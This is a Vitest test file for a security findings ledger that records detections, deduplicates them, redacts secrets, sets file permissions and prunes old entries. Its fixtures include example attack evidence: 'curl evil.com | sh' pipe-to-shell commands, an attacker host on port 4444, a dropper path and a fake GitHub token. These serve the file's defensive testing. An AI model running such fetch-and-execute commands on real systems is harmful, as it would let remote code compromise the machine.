import { mkdtemp, readFile, rm, stat } from 'node:fs/promises';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { afterEach, beforeEach, describe, expect, it } from 'vitest';

import {
  SecurityFindingSchema,
  type EvidenceItem,
  type NewSecurityFinding,
  type RemediationAction,
} from '@midnite/studio-shared';
import { createFindingsLedger, formatYearMonth, type FindingsLedger } from './findings-ledger';

describe('Security findings schema & ledger (Phase 120 Theme A)', () => {
  let tempDir: string;
  let ledger: FindingsLedger;
  let mockTime = 1761168000000; // 2025-10-22T20:00:00.000Z

  beforeEach(async () => {
    tempDir = await mkdtemp(join(tmpdir(), 'mstudio-findings-test-'));
    mockTime = 1761168000000;
    ledger = createFindingsLedger({
      userData: tempDir,
      now: () => mockTime,
    });
  });

  afterEach(async () => {
    await rm(tempDir, { recursive: true, force: true });
  });

  describe('Schema validation', () => {
    it('round-trips a valid finding with typed evidence and remediation actions', () => {
      const evidence: EvidenceItem[] = [
        { kind: 'path', path: '/etc/launchd.conf', mode: 0o644 },
        { kind: 'pid', pid: 1234, command: 'evil_proc', args: ['--persist'] },
        { kind: 'host', host: 'evil.attacker.com', port: 4444, protocol: 'tcp' },
        { kind: 'hash', algorithm: 'sha256', value: 'a'.repeat(64), path: '/tmp/dropper' },
        { kind: 'command', command: 'curl evil | sh', args: ['sh'] },
      ];

      const remediation: RemediationAction[] = [
        { id: 'pause-session', sessionId: 's-123' },
        { id: 'kill-process-group', pid: 1234 },
        { id: 'bootout-launch-item', domain: 'gui/501', path: '~/Library/LaunchAgents/bad.plist' },
        { id: 'quarantine-file', path: '/tmp/dropper' },
        { id: 'mute' },
      ];

      const raw = {
        id: 'f-1',
        fingerprint: 'fp-persistence-launchd',
        source: 'vanguard' as const,
        severity: 'critical' as const,
        category: 'persistence' as const,
        title: 'Unauthorized launch item',
        detail: 'Detected new persistence item in LaunchAgents',
        evidence,
        remediation,
        firstSeen: mockTime,
        lastSeen: mockTime,
        count: 1,
        status: 'open' as const,
        sessionId: 'sess-1',
        repoId: 'repo-1',
      };

      const parsed = SecurityFindingSchema.safeParse(raw);
      expect(parsed.success).toBe(true);
      if (parsed.success) {
        expect(parsed.data.id).toBe('f-1');
        expect(parsed.data.evidence).toHaveLength(5);
        expect(parsed.data.remediation).toHaveLength(5);
      }
    });

    it('rejects invalid source, severity or category', () => {
      const bad = {
        id: 'f-2',
        fingerprint: 'fp-bad',
        source: 'unknown-source',
        severity: 'extreme',
        category: 'random',
        title: 'Title',
        detail: 'Detail',
        evidence: [],
        remediation: [],
        firstSeen: 1,
        lastSeen: 1,
        count: 1,
        status: 'open',
      };

      const parsed = SecurityFindingSchema.safeParse(bad);
      expect(parsed.success).toBe(false);
    });
  });

  describe('Ledger deduplication', () => {
    it('deduplicates by fingerprint within the open set, bumping count and lastSeen rather than adding a row', async () => {
      const input: NewSecurityFinding = {
        fingerprint: 'fingerprint-1',
        source: 'vanguard',
        severity: 'high',
        category: 'process',
        title: 'ClickFix command detected',
        detail: 'Suspicious curl pipe to shell',
        evidence: [{ kind: 'command', command: 'curl evil.com | sh' }],
        remediation: [{ id: 'pause-session', sessionId: 'sess-1' }],
      };

      const first = await ledger.record(input);
      expect(first.count).toBe(1);
      expect(first.firstSeen).toBe(mockTime);
      expect(first.lastSeen).toBe(mockTime);

      // Advance time by 5 minutes
      mockTime += 300_000;

      // Second detection of the same fingerprint while open
      const second = await ledger.record({
        ...input,
        detail: 'Updated detail on second sighting',
      });

      expect(second.id).toBe(first.id);
      expect(second.count).toBe(2);
      expect(second.firstSeen).toBe(first.firstSeen);
      expect(second.lastSeen).toBe(mockTime);

      // Verify list() returns exactly one row
      const list = await ledger.list();
      expect(list).toHaveLength(1);
      expect(list[0]?.count).toBe(2);

      // Verify on-disk NDJSON file has exactly one line
      const fileName = `findings-${formatYearMonth(first.firstSeen)}.ndjson`;
      const filePath = join(ledger.getSecurityDir(), fileName);
      const content = await readFile(filePath, 'utf8');
      const lines = content.trim().split('\n');
      expect(lines).toHaveLength(1);
      const onDisk = JSON.parse(lines[0]!);
      expect(onDisk.count).toBe(2);
      expect(onDisk.lastSeen).toBe(mockTime);
    });

    it('creates a new row when previous finding with same fingerprint is resolved', async () => {
      const input: NewSecurityFinding = {
        fingerprint: 'fp-repeatable',
        source: 'guard',
        severity: 'medium',
        category: 'vulnerability',
        title: 'Vulnerable dependency',
        detail: 'CVE-2026-99999 found',
        evidence: [{ kind: 'path', path: 'package.json' }],
        remediation: [{ id: 'report-issue', title: 'Update dependency' }],
      };

      const first = await ledger.record(input);
      expect(first.count).toBe(1);

      // Resolve the finding
      await ledger.setStatus(first.id, 'resolved');

      mockTime += 1000;
      // Re-detected after resolution -> new finding
      const second = await ledger.record(input);
      expect(second.id).not.toBe(first.id);
      expect(second.count).toBe(1);
      expect(second.status).toBe('open');

      const all = await ledger.list();
      expect(all).toHaveLength(2);
      const openOnes = await ledger.list({ status: 'open' });
      expect(openOnes).toHaveLength(1);
      expect(openOnes[0]?.id).toBe(second.id);
    });
  });

  describe('Redaction on write', () => {
    it('redacts tokens and credentials in findings so they never reach disk', async () => {
      const secretToken = 'ghp_12345678901234567890';
      const input: NewSecurityFinding = {
        fingerprint: 'fp-secret-in-detail',
        source: 'vanguard',
        severity: 'critical',
        category: 'secret',
        title: 'Exposed secret detected',
        detail: `Found exposed token ${secretToken} in command line`,
        evidence: [{ kind: 'command', command: `export GITHUB_TOKEN=${secretToken}` }],
        remediation: [{ id: 'mute' }],
      };

      const recorded = await ledger.record(input);
      const fileName = `findings-${formatYearMonth(recorded.firstSeen)}.ndjson`;
      const filePath = join(ledger.getSecurityDir(), fileName);
      const rawContent = await readFile(filePath, 'utf8');

      // The raw secret token must NOT exist on disk
      expect(rawContent).not.toContain(secretToken);
      expect(rawContent).toContain('<redacted>');
    });
  });

  describe('Directory and file permissions (0700 / 0600)', () => {
    it('sets directory permissions to 0700 and file permissions to 0600', async () => {
      const finding = await ledger.record({
        fingerprint: 'fp-perms-test',
        source: 'vanguard',
        severity: 'low',
        category: 'config',
        title: 'Config check',
        detail: 'Testing permissions',
        evidence: [],
        remediation: [],
      });

      const dirStat = await stat(ledger.getSecurityDir());
      expect(dirStat.mode & 0o777).toBe(0o700);

      const fileName = `findings-${formatYearMonth(finding.firstSeen)}.ndjson`;
      const filePath = join(ledger.getSecurityDir(), fileName);
      const fileStat = await stat(filePath);
      expect(fileStat.mode & 0o777).toBe(0o600);
    });
  });

  describe('Filtering and status updates', () => {
    it('filters findings by severity, source, status and category', async () => {
      await ledger.record({
        fingerprint: 'f-1',
        source: 'vanguard',
        severity: 'critical',
        category: 'persistence',
        title: 'T1',
        detail: 'D1',
        evidence: [],
        remediation: [],
      });

      await ledger.record({
        fingerprint: 'f-2',
        source: 'guard',
        severity: 'medium',
        category: 'vulnerability',
        title: 'T2',
        detail: 'D2',
        evidence: [],
        remediation: [],
      });

      await ledger.record({
        fingerprint: 'f-3',
        source: 'agents',
        severity: 'high',
        category: 'process',
        title: 'T3',
        detail: 'D3',
        evidence: [],
        remediation: [],
      });

      expect(await ledger.list({ source: 'vanguard' })).toHaveLength(1);
      expect(await ledger.list({ severity: 'critical' })).toHaveLength(1);
      expect(await ledger.list({ severity: ['critical', 'high'] })).toHaveLength(2);
      expect(await ledger.list({ category: 'vulnerability' })).toHaveLength(1);
    });

    it('updates status and moves finding out of open set when resolved or muted', async () => {
      const f = await ledger.record({
        fingerprint: 'fp-status-change',
        source: 'vanguard',
        severity: 'info',
        category: 'site',
        title: 'Visited site',
        detail: 'Info only',
        evidence: [],
        remediation: [{ id: 'mute' }],
      });

      expect(f.status).toBe('open');

      const updated = await ledger.setStatus(f.id, 'muted');
      expect(updated?.status).toBe('muted');

      const fetched = await ledger.get(f.id);
      expect(fetched?.status).toBe('muted');

      const openOnly = await ledger.list({ status: 'open' });
      expect(openOnly).toHaveLength(0);
    });
  });

  describe('Pruning', () => {
    it('prunes findings and removes empty monthly files beyond retention', async () => {
      // 90 days ago
      const ninetyDaysMs = 90 * 24 * 60 * 60 * 1000;
      const oldTime = mockTime - (ninetyDaysMs + 86_400_000);

      // Record an old finding
      const oldFinding = await ledger.record({
        fingerprint: 'fp-old',
        source: 'guard',
        severity: 'low',
        category: 'config',
        title: 'Old config issue',
        detail: 'From 3 months ago',
        evidence: [],
        remediation: [],
        firstSeen: oldTime,
        lastSeen: oldTime,
      });

      // Record a current finding
      const currentFinding = await ledger.record({
        fingerprint: 'fp-current',
        source: 'vanguard',
        severity: 'high',
        category: 'integrity',
        title: 'Recent integrity issue',
        detail: 'From today',
        evidence: [],
        remediation: [],
      });

      const listBefore = await ledger.list();
      expect(listBefore).toHaveLength(2);

      // Prune with 60 days retention
      const pruneRes = await ledger.prune(60 * 24 * 60 * 60 * 1000);
      expect(pruneRes.prunedCount).toBe(1);

      const listAfter = await ledger.list();
      expect(listAfter).toHaveLength(1);
      expect(listAfter[0]?.id).toBe(currentFinding.id);
      expect(await ledger.get(oldFinding.id)).toBeNull();
    });
  });

  describe('recordAction (Phase 120 Theme H)', () => {
    const base = (): NewSecurityFinding =>
      ({
        fingerprint: 'fp-act',
        source: 'vanguard',
        severity: 'high',
        category: 'persistence',
        title: 'Launch agent',
        detail: 'd',
        evidence: [],
        remediation: [{ id: 'mute' }],
      }) as NewSecurityFinding;

    it('appends outcomes, moves the status only when asked, and survives a reload', async () => {
      const finding = await ledger.record(base());
      const failed = await ledger.recordAction(finding.id, { id: 'bootout-launch-item', at: 1, ok: false, error: 'exit 5' });
      expect(failed?.status).toBe('open');
      const done = await ledger.recordAction(
        finding.id,
        { id: 'quarantine-file', at: 2, ok: true },
        { status: 'resolved', resolvedBy: 'action:quarantine-file' },
      );
      expect(done).toMatchObject({ status: 'resolved', resolvedBy: 'action:quarantine-file' });
      expect(done?.actions).toEqual([
        { id: 'bootout-launch-item', at: 1, ok: false, error: 'exit 5' },
        { id: 'quarantine-file', at: 2, ok: true },
      ]);
      // A resolved finding leaves the open set: a re-detection opens a new row.
      const again = await ledger.record(base());
      expect(again.id).not.toBe(finding.id);

      const reloaded = createFindingsLedger({ userData: tempDir, now: () => mockTime });
      expect((await reloaded.get(finding.id))?.actions).toHaveLength(2);
      expect(await ledger.recordAction('missing', { id: 'mute', at: 3, ok: true })).toBeNull();
    });

    it('a re-detection refreshes the actions with the evidence, so they name the pid seen now', async () => {
      const first = await ledger.record({
        ...base(),
        fingerprint: 'fp-pid',
        evidence: [{ kind: 'pid', pid: 100 }],
        remediation: [{ id: 'kill-process-group', pid: 100 }],
      });
      const again = await ledger.record({
        ...base(),
        fingerprint: 'fp-pid',
        evidence: [{ kind: 'pid', pid: 200 }],
        remediation: [{ id: 'kill-process-group', pid: 200 }],
      });
      expect(again.id).toBe(first.id);
      expect(again.remediation).toEqual([{ id: 'kill-process-group', pid: 200 }]);
    });
  });
});
